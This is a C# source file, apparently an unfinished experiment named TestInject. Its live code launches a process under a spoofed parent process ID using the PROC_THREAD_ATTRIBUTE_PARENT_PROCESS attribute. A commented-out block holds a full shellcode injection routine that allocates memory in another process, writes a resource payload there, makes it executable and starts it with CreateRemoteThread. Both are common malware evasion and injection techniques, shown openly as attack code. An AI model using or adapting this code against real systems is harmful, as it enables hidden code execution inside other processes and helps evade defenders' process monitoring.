using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Native.Kernel32;

namespace TestInject
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
        uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll")]
        static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
        ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);



        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
       string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
       IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
            IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        public static int? CreateProcess(string appName, int? parentProcessId = null)
        {
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            var pInfo = new PROCESS_INFORMATION();
            var sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                if (parentProcessId > 0)
                {
                    var lpSize = IntPtr.Zero;
                    var success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                    if (success || lpSize == IntPtr.Zero)
                    {
                        return null;
                    }

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                    if (!success)
                    {
                        return null;
                    }

                    var parentHandle = Process.GetProcessById(parentProcessId.Value).Handle;
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    success = UpdateProcThreadAttribute(
                        sInfoEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValue,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                    if (!success)
                    {
                        return null;
                    }
                }

                var pSec = new SECURITY_ATTRIBUTES();
                var tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);
                //var lpApplicationName = Path.Combine(Environment.SystemDirectory, appName);
                var lpApplicationName = appName;
                //if(CreateProcess(lpApplicationName, null, ref pSec, ref tSec, false, (uint)(CreationFlags.ExtendedStartupInfoPresent/* | CreationFlags.CreateSuspended | CreationFlags.CreateNoWindow*/), IntPtr.Zero, null, ref sInfoEx, out pInfo))
                //{
                //    return GetProcessId(pInfo.hProcess);
                //}
                if (CreateProcess(null, "cmd /c echo toto", ref pSec, ref tSec, false, (uint)(CreationFlags.ExtendedStartupInfoPresent/* | CreationFlags.CreateSuspended | CreationFlags.CreateNoWindow*/), IntPtr.Zero, null, ref sInfoEx, out pInfo))
                {
                    return GetProcessId(pInfo.hProcess);
                }
            }
            finally
            {
                // Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hThread);
                }
            }
            return null;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);
        static void Main(string[] args)
        {
            string output = string.Empty;

            var procId = CreateProcess(Path.Combine(Environment.SystemDirectory, "cmd.exe"));
            if (!procId.HasValue)
            {
                Console.WriteLine($"Failed to create process, error code: {Marshal.GetLastWin32Error()}");
                return;
            }


            //Thread.Sleep(1000);


            Process process = Process.GetProcessById(procId.Value);
            //foreach (var p in Process.GetProcessesByName("notepad"))
            //{
            //    try
            //    {

            //        if (p.Handle == pInfo.hProcess)
            //        {
            //            process = p;
            //        }
            //        Console.WriteLine($"{p.ProcessName}({p.Id}) - {p.Handle} <> {pInfo.hProcess}");

            //    }
            //    catch(Exception ex)
            //    {
            //        //Console.WriteLine(ex.ToString());
            //    }


            //}

            /*var startInfo = new ProcessStartInfo()
            {
                FileName = "notepad.exe",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,

            };

            var process = new Process
            {
                StartInfo = startInfo,
            };
            process.Start();
             */

            //process.OutputDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };
            //process.ErrorDataReceived += (s, e) => { output += e.Data + Environment.NewLine; };




            //process.BeginOutputReadLine();
            //process.BeginErrorReadLine();

            /*IntPtr pHandle = process.Handle;

            var shellcode = Properties.Resources.Payload;


            

            var baseAddress = Native.Kernel32.VirtualAllocEx(
                pHandle,
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");
                return;
            }

            try
            {
                IntPtr bytesWritten = IntPtr.Zero;
                if (!Native.Kernel32.WriteProcessMemory(pHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                {
                    Console.WriteLine($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");
                    return;
                }

                if (bytesWritten.ToInt32() != shellcode.Length)
                {
                    Console.WriteLine($"Failed to write All the shellcode into the process");
                    return;
                }

                if (!Native.Kernel32.VirtualProtectEx(
                    pHandle,
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                IntPtr threadres = IntPtr.Zero;

                IntPtr thread = Native.Kernel32.CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

                if (thread == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                //Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {

            }
            finally
            {
                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }

            Console.WriteLine(output);*/
            //Thread.Sleep(5000);


            while (!process.StandardOutput.EndOfStream)
            {
                string line = process.StandardOutput.ReadLine();
                // do something with line
            }
            Console.WriteLine(output);
            Console.WriteLine("key plz");
            Console.ReadKey();
            return;
        }
    }
}
